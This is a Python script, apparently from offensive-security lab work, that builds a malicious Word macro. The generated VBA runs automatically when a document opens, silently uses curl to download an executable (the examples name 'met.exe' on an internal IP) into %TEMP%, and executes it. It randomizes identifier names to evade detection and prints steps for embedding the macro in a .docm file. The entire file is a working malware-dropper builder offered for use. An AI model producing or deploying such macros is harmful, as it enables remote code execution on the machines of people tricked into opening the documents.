#!/usr/bin/env python3

import argparse
import random
import string
import sys
from pathlib import Path
from urllib.parse import urlparse


def rand_ident(rng: random.Random, length_range=(6, 11)) -> str:
    length = rng.randint(*length_range)
    first = rng.choice(string.ascii_letters)
    rest = "".join(rng.choices(string.ascii_letters + string.digits, k=length - 1))
    return first + rest


def unique_names(rng: random.Random, count: int) -> list:
    names = set()
    while len(names) < count:
        names.add(rand_ident(rng))
    return list(names)


VBA_TEMPLATE = """\
Sub {fn_main}()
    Dim {v_shell} As Object
    Dim {v_tmp} As String

    Set {v_shell} = CreateObject("WScript.Shell")
    {v_tmp} = {v_shell}.ExpandEnvironmentStrings("%TEMP%")

    {v_shell}.Run "cmd.exe /c curl -s {url} --output " & _
               {v_tmp} & "\\{filename} && " & {v_tmp} & "\\{filename}", 0, False
End Sub

Sub AutoOpen()
    {fn_main}
End Sub
"""

KEYS = ["fn_main", "v_shell", "v_tmp"]


def build_vba(url: str, filename: str, rng: random.Random) -> str:
    names = unique_names(rng, len(KEYS))
    mapping = dict(zip(KEYS, names))
    mapping["url"] = url
    mapping["filename"] = filename
    return VBA_TEMPLATE.format(**mapping)


def main():
    ap = argparse.ArgumentParser(
        description="Build simple VBA downloader/executor (curl + run from %TEMP%)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:

  Download and run:
    python3 build_downloader.py --url http://192.168.45.188/met.exe

  Custom destination filename:
    python3 build_downloader.py --url http://192.168.45.188/pl.exe --filename stage.exe

  Reproducible build:
    python3 build_downloader.py --url http://192.168.45.188/met.exe --seed 42
        """,
    )
    ap.add_argument("--url", required=True, help="URL of the executable to download")
    ap.add_argument("--filename", default=None,
                    help="Destination filename in %%TEMP%% (default: basename of URL)")
    ap.add_argument("-o", "--output", default="downloader.vba", help="Output .vba path")
    ap.add_argument("--seed", type=int, default=None,
                    help="Seed for identifier randomization (omit for fully random)")
    args = ap.parse_args()

    filename = args.filename or Path(urlparse(args.url).path).name
    if not filename:
        sys.exit("[-] Could not derive filename from URL; pass --filename")

    rng = random.Random(args.seed) if args.seed is not None else random.Random()
    vba = build_vba(args.url, filename, rng)

    Path(args.output).write_text(vba)
    print(f"[+] URL:          {args.url}", file=sys.stderr)
    print(f"[+] Destination:  %TEMP%\\{filename}", file=sys.stderr)
    print(f"[+] Main sub:     {vba.split('Sub ')[1].split('(')[0]}", file=sys.stderr)
    print(f"[+] Wrote         {args.output} ({len(vba)} chars)", file=sys.stderr)
    print("[+] Open Word, Alt+F11, paste into ThisDocument, Save as .docm", file=sys.stderr)


if __name__ == "__main__":
    main()
